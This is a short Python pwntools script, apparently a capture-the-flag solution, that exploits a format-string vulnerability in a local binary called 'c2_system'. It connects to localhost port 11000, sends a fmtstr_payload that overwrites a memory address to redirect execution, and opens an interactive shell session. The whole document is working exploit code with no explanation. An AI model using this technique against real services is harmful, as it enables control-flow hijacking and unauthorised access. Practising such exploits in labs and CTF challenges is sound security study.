from pwn import *

elf = context.binary = ELF("../dist/c2_system")
p = remote("localhost", 11000)
# p = elf.process() 

payload = fmtstr_payload(6, {0x403250: 0x401c35})

p.sendline(payload)
p.interactive()